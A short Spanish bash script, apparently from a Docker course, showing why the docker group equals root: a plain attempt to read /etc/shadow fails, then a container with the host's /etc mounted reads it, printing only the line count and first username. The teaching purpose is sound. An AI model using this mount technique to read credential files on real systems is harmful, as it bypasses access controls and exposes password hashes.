#!/usr/bin/env bash
# fig01_07.sh — Por qué el grupo docker equivale a root.
# Córrelo SIN sudo, como tu usuario normal (que ya está en el grupo docker).
# Lee /etc/shadow, el archivo de contraseñas cifradas que solo root y el grupo shadow pueden leer,
# y solo imprime cuántos renglones tiene y el primer NOMBRE de usuario: nada secreto.
set -uo pipefail
IMAGEN=debian:13.7-slim

echo "== 1. Tú, sin sudo, intentas leer /etc/shadow"
ls -l /etc/shadow | awk '{print $1, $3, $4, $NF}'
cat /etc/shadow > /dev/null
echo "código de salida: $?"

echo
echo "== 2. Lo mismo, pero se lo pides al daemon de Docker"
docker run --rm --name curso-docker-llave -v /etc:/anfitrion-etc:ro "$IMAGEN" sh -c '
  id
  echo "renglones de /etc/shadow que pude leer: $(wc -l < /anfitrion-etc/shadow)"
  echo "primer usuario de la lista: $(cut -d: -f1 /anfitrion-etc/shadow | head -1)"'
echo "código de salida: $?"
